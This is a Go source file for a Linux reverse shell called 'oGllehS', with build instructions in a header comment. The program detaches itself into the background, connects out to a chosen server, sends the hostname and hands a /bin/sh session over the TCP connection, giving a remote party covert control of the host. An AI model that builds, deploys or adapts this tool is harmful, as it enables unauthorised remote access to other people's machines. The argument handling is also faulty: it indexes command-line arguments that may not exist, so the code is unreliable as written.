//go:build linux

/*
To build, edit the serverIp and serverPort variable, if wanted, and use the following command:
GOOS=linux GOARCH=amd64 go build -o oGllehS cmd/linux/main.go
*/
package main

import (
	"fmt"
	"net"
	"os"
	"os/exec"
)

func main() {
	// Set server ip and port to null
	// Can set these before building if you want to hardcode them, otherwise they will be read from command-line arguments
	serverIP := ""
	serverPort := ""

	// Help message to show usage using -h flag
	if os.Args[1] == "-h" || os.Args[1] == "--help" {
		fmt.Println("If you want to provide IP and Port at runtime, use:")
		fmt.Println("oGllehS <serverIP> <serverPort>")
		fmt.Println("")
		fmt.Println("If you want to hardcode the IP and Port, set the serverIP and serverPort variables in the main function before building.")
		return
	}

	// Check if arguments are provided
	switch len(os.Args) {
	case 2:
		serverIP = os.Args[1]
		serverPort = os.Args[2]
	case 0:
		fmt.Printf("Attempting to use hardcoded IP and Port: %s:%s\n", serverIP, serverPort)
		if serverIP != "" && serverPort != "" {
			break
		}
		fallthrough
	default:
		fmt.Println("If you want to provide IP and Port at runtime, use:")
		fmt.Println("oGllehS <serverIP> <serverPort>")
		fmt.Println("")
		fmt.Println("If you want to hardcode the IP and Port, set the serverIP and serverPort variables in the main function before building.")
		return
	}

	// Check if already running in the background
	if os.Getenv("IS_BACKGROUND") != "1" {
		// Fork and detach the process
		cmd := exec.Command(os.Args[0], os.Args[1:]...)
		cmd.Env = append(os.Environ(), "IS_BACKGROUND=1")
		cmd.Stdin = nil
		cmd.Stdout = nil
		cmd.Stderr = nil
		cmd.Start()
		os.Exit(0)
	}

	address := net.JoinHostPort(serverIP, serverPort)
	conn, err := net.Dial("tcp", address)
	if err != nil {
		fmt.Printf("Error connecting to server: %v\n", err)
		return
	}
	defer conn.Close()

	hostname, _ := os.Hostname()
	conn.Write([]byte("Connected to host: " + hostname + "\n"))

	// Determine the shell
	shell := "/bin/sh" // Default shell for Linux

	// Create the command to execute the shell
	cmd := exec.Command(shell)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start the shell process
	if err := cmd.Run(); err != nil {
		fmt.Printf("Error starting shell: %v\n", err)
	}

	fmt.Printf("Connected to server at %s\n", address)
}
